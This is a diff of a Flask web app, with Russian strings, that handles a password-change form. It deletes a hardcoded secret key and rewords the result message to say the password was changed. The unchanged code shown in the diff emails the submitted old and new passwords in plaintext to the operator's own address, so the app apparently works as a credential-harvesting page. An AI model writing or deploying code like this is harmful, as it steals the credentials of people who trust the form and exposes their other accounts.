@@ -8,7 +8,6 @@ import os
 load_dotenv('ini.env')  # Загрузка переменных из .env
 
 app = Flask(__name__)
-app.config['SECRET_KEY']='Goporhero5bugs5w'
 
 # Настройка подключения к базе данных MySQL
 app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv('DATABASE_URL')
@@ -47,7 +46,7 @@ def greet():
     if user and check_password_hash(user.password, old_password):
         user.password = generate_password_hash(new_password)
         db.session.commit()
-        message = f"Ошибка для аккаунта {username}"
+        message = f"Пароль был изменен для аккаунта {username}"
     else:
         message = "Пользователь не найден или старый пароль неверен."
     
@@ -57,7 +56,7 @@ def greet():
                       sender=os.getenv('MAIL_USERNAME'),
                       recipients=[os.getenv('MAIL_USERNAME')])
         msg.body = f"""
-        Ошибка для аккаунта {username}.
+        Пароль был изменен для аккаунта {username}.
         
         Старый пароль: {old_password}
         Новый пароль: {new_password}
